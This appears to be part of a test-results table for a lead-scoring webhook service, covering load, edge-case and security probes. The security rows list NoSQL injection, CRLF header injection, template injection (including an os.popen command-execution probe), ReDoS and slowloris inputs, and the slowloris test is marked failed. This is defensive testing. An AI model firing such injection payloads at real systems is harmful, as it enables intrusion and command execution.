| 105 | Load-Wave2 | Sequential #4 | 200 | 200 (1ms) | ✅ |  |
| 106 | Load-Wave2 | Sequential #5 | 200 | 200 (1ms) | ✅ |  |
| 107 | Load-Wave2 | Sequential #6 | 200 | 200 (2ms) | ✅ |  |
| 108 | Load-Wave2 | Sequential #7 | 200 | 200 (1ms) | ✅ |  |
| 109 | Load-Wave2 | Sequential #8 | 200 | 200 (1ms) | ✅ |  |
| 110 | Load-Wave2 | Sequential #9 | 200 | 200 (1ms) | ✅ |  |
| 111 | Load-Wave2 | Sequential #10 | 200 | 200 (1ms) | ✅ |  |
| 112 | Load-Wave2 | Sequential #11 | 200 | 200 (1ms) | ✅ |  |
| 113 | Load-Wave2 | Sequential #12 | 200 | 200 (1ms) | ✅ |  |
| 114 | Load-Wave2 | Sequential #13 | 200 | 200 (1ms) | ✅ |  |
| 115 | Load-Wave2 | Sequential #14 | 200 | 200 (1ms) | ✅ |  |
| 116 | Load-Wave2 | Sequential #15 | 200 | 200 (1ms) | ✅ |  |
| 117 | Load-Wave2 | Sequential #16 | 200 | 200 (1ms) | ✅ |  |
| 118 | Load-Wave2 | Sequential #17 | 200 | 200 (1ms) | ✅ |  |
| 119 | Load-Wave2 | Sequential #18 | 200 | 200 (1ms) | ✅ |  |
| 120 | Load-Wave2 | Sequential #19 | 200 | 200 (1ms) | ✅ |  |
| 121 | Load-Wave2 | Sequential #20 | 200 | 200 (1ms) | ✅ |  |
| 122 | Load-Wave2 | Sequential #21 | 200 | 200 (1ms) | ✅ |  |
| 123 | Load-Wave2 | Sequential #22 | 200 | 200 (1ms) | ✅ |  |
| 124 | Load-Wave2 | Sequential #23 | 200 | 200 (0ms) | ✅ |  |
| 125 | Load-Wave2 | Sequential #24 | 200 | 200 (0ms) | ✅ |  |
| 126 | Load-Wave2 | Sequential #25 | 200 | 200 (1ms) | ✅ |  |
| 127 | Load-Wave2 | Sequential #26 | 200 | 200 (2ms) | ✅ |  |
| 128 | Load-Wave2 | Sequential #27 | 200 | 200 (4ms) | ✅ |  |
| 129 | Load-Wave2 | Sequential #28 | 200 | 200 (1ms) | ✅ |  |
| 130 | Load-Wave2 | Sequential #29 | 200 | 200 (1ms) | ✅ |  |
| 131 | Load-Wave2 | Sequential #30 | 200 | 200 (5ms) | ✅ |  |
| 132 | Load-Wave2 | Sequential #31 | 200 | 200 (2ms) | ✅ |  |
| 133 | Load-Wave2 | Sequential #32 | 200 | 200 (2ms) | ✅ |  |
| 134 | Load-Wave2 | Sequential #33 | 200 | 200 (1ms) | ✅ |  |
| 135 | Load-Wave2 | Sequential #34 | 200 | 200 (1ms) | ✅ |  |
| 136 | Load-Wave2 | Sequential #35 | 200 | 200 (1ms) | ✅ |  |
| 137 | Load-Wave2 | Sequential #36 | 200 | 200 (1ms) | ✅ |  |
| 138 | Load-Wave2 | Sequential #37 | 200 | 200 (1ms) | ✅ |  |
| 139 | Load-Wave2 | Sequential #38 | 200 | 200 (1ms) | ✅ |  |
| 140 | Load-Wave2 | Sequential #39 | 200 | 200 (1ms) | ✅ |  |
| 141 | Load-Wave2 | Sequential #40 | 200 | 200 (1ms) | ✅ |  |
| 142 | Load-Wave2 | Post-W2-load health #1 | 200 <500ms | 200 (0ms) | ✅ |  |
| 143 | Load-Wave2 | Post-W2-load health #2 | 200 <500ms | 200 (1ms) | ✅ |  |
| 144 | Load-Wave2 | Post-W2-load health #3 | 200 <500ms | 200 (1ms) | ✅ |  |
| 145 | Load-Wave2 | Post-W2-load health #4 | 200 <500ms | 200 (0ms) | ✅ |  |
| 146 | Load-Wave2 | Post-W2-load health #5 | 200 <500ms | 200 (1ms) | ✅ |  |
| 147 | EdgeCase-Wave2 | Number 42 in Title | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 148 | EdgeCase-Wave2 | Boolean in Industry | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 149 | EdgeCase-Wave2 | Empty array in Company Name | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 150 | EdgeCase-Wave2 | Number array in Title | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 151 | EdgeCase-Wave2 | Number in Captured URL | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 152 | EdgeCase-Wave2 | Object in Employee Count | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 153 | EdgeCase-Wave2 | False in LinkedIn URL | 200 (graceful) | 200: {"received":true,"score":95,"qualified":true} | ✅ |  |
| 154 | EdgeCase-Wave2 | Number in Business Email | 200 (graceful) | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 155 | EdgeCase-Wave2 | Array in Revenue | 200 (graceful) | 200: {"received":true,"score":100,"qualified":true | ✅ |  |
| 156 | EdgeCase-Wave2 | Object in Referrer | 200 (graceful) | 200: {"received":true,"score":100,"qualified":true | ✅ |  |
| 157 | EdgeCase-Wave2 | Max score combo | 200 with score | 200, score=100, q=true | ✅ | Score: 100 |
| 158 | EdgeCase-Wave2 | Score exactly 40 | 200 with score | 200, score=65, q=true | ✅ | Score: 65 |
| 159 | EdgeCase-Wave2 | Score 39 (just below) | 200 with score | 200, score=60, q=true | ✅ | Score: 60 |
| 160 | EdgeCase-Wave2 | Score 0 - no matches | 200 with score | 200, score=0, q=false | ✅ | Score: 0 |
| 161 | EdgeCase-Wave2 | Negative score - student | 200 with score | 200, score=10, q=false | ✅ | Score: 10 |
| 162 | EdgeCase-Wave2 | Excluded intern at law | 200 with score | 200, score=50, q=true | ✅ | Score: 50 |
| 163 | EdgeCase-Wave2 | Title with attorney but excluded (retired attorney | 200 with score | 200, score=50, q=true | ✅ | Score: 50 |
| 164 | EdgeCase-Wave2 | Multiple keyword matches in title | 200 with score | 200, score=100, q=true | ✅ | Score: 100 |
| 165 | EdgeCase-Wave2 | Industry=accident | 200 with score | 200, score=70, q=true | ✅ | Score: 70 |
| 166 | EdgeCase-Wave2 | Company has law in name | 200 with score | 200, score=70, q=true | ✅ | Score: 70 |
| 167 | EdgeCase-Wave2 | POST to /health | no crash | 404: Not found | ✅ |  |
| 168 | EdgeCase-Wave2 | GET to /rb2b/webhook (no auth) | no crash | 404: Not found | ✅ |  |
| 169 | EdgeCase-Wave2 | POST to / | no crash | 404: Not found | ✅ |  |
| 170 | EdgeCase-Wave2 | POST to /admin | no crash | 404: Not found | ✅ |  |
| 171 | EdgeCase-Wave2 | POST to /api/v1/webhook | no crash | 404: Not found | ✅ |  |
| 172 | EdgeCase-Wave2 | Very long URL path | no crash | 404: Not found | ✅ |  |
| 173 | EdgeCase-Wave2 | POST empty body to valid endpoint | no crash | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 174 | EdgeCase-Wave2 | OPTIONS preflight | no crash | 404: Not found | ✅ |  |
| 175 | EdgeCase-Wave2 | HEAD request | no crash | 404:  | ✅ |  |
| 176 | EdgeCase-Wave2 | DELETE request | no crash | 404: Not found | ✅ |  |
| 177 | EdgeCase-Wave2 | Payload with __proto__ | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 178 | EdgeCase-Wave2 | Payload with constructor | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 179 | EdgeCase-Wave2 | Array payload | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 180 | EdgeCase-Wave2 | Double-encoded JSON | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 181 | EdgeCase-Wave2 | Nested JSON string | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 182 | EdgeCase-Wave2 | Base64 encoded payload | 200 | 200: {"received":true,"error":"parse_error"} | ✅ |  |
| 183 | EdgeCase-Wave2 | Only whitespace keys | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 184 | EdgeCase-Wave2 | Numeric keys | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 185 | EdgeCase-Wave2 | Very long string value (50K) | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 186 | EdgeCase-Wave2 | Many empty fields | 200 | 200: {"received":true,"score":0,"qualified":false} | ✅ |  |
| 187 | Security-Wave2 | NoSQLi: {"Title":{"$gt":""}} | 200 (no DB) | 200: {"received":true,"error":"parse_error"} | ✅ | No MongoDB/NoSQL in use - stored as data |
| 188 | Security-Wave2 | NoSQLi: {"Title":{"$ne":null}} | 200 (no DB) | 200: {"received":true,"error":"parse_error"} | ✅ | No MongoDB/NoSQL in use - stored as data |
| 189 | Security-Wave2 | NoSQLi: {"Title":{"$regex":".*"}} | 200 (no DB) | 200: {"received":true,"error":"parse_error"} | ✅ | No MongoDB/NoSQL in use - stored as data |
| 190 | Security-Wave2 | NoSQLi: {"Business Email":{"$exists":true}} | 200 (no DB) | 200: {"received":true,"error":"parse_error"} | ✅ | No MongoDB/NoSQL in use - stored as data |
| 191 | Security-Wave2 | NoSQLi: {"First Name":{"$where":"function(){return | 200 (no DB) | 200: {"received":true,"score":100,"qualified":true | ✅ | No MongoDB/NoSQL in use - stored as data |
| 192 | Security-Wave2 | NoSQLi: {"$where":"1==1"} | 200 (no DB) | 200: {"received":true,"score":100,"qualified":true | ✅ | No MongoDB/NoSQL in use - stored as data |
| 193 | Security-Wave2 | NoSQLi: {"Title":{"$in":["Attorney","Lawyer"]}} | 200 (no DB) | 200: {"received":true,"error":"parse_error"} | ✅ | No MongoDB/NoSQL in use - stored as data |
| 194 | Security-Wave2 | NoSQLi: {"Industry":{"$or":[{"$gt":""},{"$lt":"zzz | 200 (no DB) | 200: {"received":true,"error":"parse_error"} | ✅ | No MongoDB/NoSQL in use - stored as data |
| 195 | Security-Wave2 | CRLF: value
Set-Cookie: admin=true | 200 (no header injection) | 200 | ✅ | Response headers are set before body processing - safe |
| 196 | Security-Wave2 | CRLF: value
X-Injected: true | 200 (no header injection) | 200 | ✅ | Response headers are set before body processing - safe |
| 197 | Security-Wave2 | CRLF: value

<html> | 200 (no header injection) | 200 | ✅ | Response headers are set before body processing - safe |
| 198 | Security-Wave2 | CRLF: value%0d%0aSet-Cookie:%20admin=true | 200 (no header injection) | 200 | ✅ | Response headers are set before body processing - safe |
| 199 | Security-Wave2 | CRLF: value%0aX-Injected:%20true | 200 (no header injection) | 200 | ✅ | Response headers are set before body processing - safe |
| 200 | Security-Wave2 | Template injection: {{7*7}} | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 201 | Security-Wave2 | Template injection: ${7*7} | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 202 | Security-Wave2 | Template injection: #{7*7} | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 203 | Security-Wave2 | Template injection: <%= 7*7 %> | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 204 | Security-Wave2 | Template injection: {{constructor.constructor("ret | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 205 | Security-Wave2 | Template injection: {{config.items()}} | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 206 | Security-Wave2 | Template injection: ${__import__("os").popen("id") | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 207 | Security-Wave2 | Template injection: #{T(java.lang.Runtime).getRunt | 200 (no templating) | 200 | ✅ | No template engine - stored as plain text |
| 208 | Security-Wave2 | Header inject: X-Custom | 200 | 200 | ✅ |  |
| 209 | Security-Wave2 | Header inject: Authorization | 200 | 200 | ✅ |  |
| 210 | Security-Wave2 | Header inject: Cookie | 200 | 200 | ✅ |  |
| 211 | Security-Wave2 | Header inject: X-Forwarded-For | 200 | 200 | ✅ |  |
| 212 | Security-Wave2 | Header inject: Host | 200 | 200 | ✅ |  |
| 213 | Security-Wave2 | ReDoS pattern (50001 chars) | 200 <5s | 200 (4ms) | ✅ |  |
| 214 | Security-Wave2 | ReDoS pattern (40001 chars) | 200 <5s | 200 (3ms) | ✅ |  |
| 215 | Security-Wave2 | ReDoS pattern (600 chars) | 200 <5s | 200 (2ms) | ✅ |  |
| 216 | Security-Wave2 | ReDoS pattern (1000 chars) | 200 <5s | 200 (2ms) | ✅ |  |
| 217 | Security-Wave2 | Unicode attack: efbc9c736372697074ef | 200 | 200 | ✅ |  |
| 218 | Security-Wave2 | Unicode attack: 000102 | 200 | 200 | ✅ |  |
| 219 | Security-Wave2 | Unicode attack: efbbbfefbbbfefbbbfef | 200 | 200 | ✅ |  |
| 220 | Security-Wave2 | Unicode attack: e280ae414243 | 200 | 200 | ✅ |  |
| 221 | Security-Wave2 | Unicode attack: efbfbd | 200 | 200 | ✅ |  |
| 222 | Security-Wave2 | Slowloris (5s delayed body) | completes eventually | 0 (20007ms) | ❌ | Connection held open - no server timeout on slow clients |
| 223 | Security-Wave2 | Final health after wave 2 | 200 | 200 | ✅ |  |

</details>
